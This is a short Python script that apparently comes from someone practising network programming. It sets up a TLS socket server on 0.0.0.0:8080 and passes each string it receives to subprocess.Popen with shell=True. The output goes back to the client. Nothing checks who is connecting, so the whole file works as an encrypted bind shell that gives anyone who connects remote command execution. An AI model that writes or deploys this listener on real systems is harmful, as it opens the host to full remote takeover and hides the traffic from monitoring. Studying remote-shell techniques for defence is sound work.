import subprocess
from base64 import decode
import socket
import ssl

host = "0.0.0.0"
port = 8080

purpose = ssl.Purpose.CLIENT_AUTH
context = ssl.create_default_context(purpose)
context.load_cert_chain(certfile='./server/server.crt', keyfile='./server/server.key')

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind((host,port))
listener.listen(2)

while True:
  raw_socket, address = listener.accept()
  ssl_sock = context.wrap_socket(raw_socket, server_side=True)

  try:
    while True:
      data = ssl_sock.recv(4096).decode('ascii')
      if data:
        # print(data)
        sh = subprocess.Popen(
          data,
          stdout=subprocess.PIPE,
          stdin=subprocess.PIPE,
          stderr=subprocess.PIPE,
          shell=True
        )
        out = sh.stdout.read() + sh.stderr.read()
        print(out)
        out = str(out).encode('ascii')
        ssl_sock.send(out) #minha linha
  finally:
    ssl_sock.shutdown(socket.SHUT_RDWR)
    ssl_sock.close()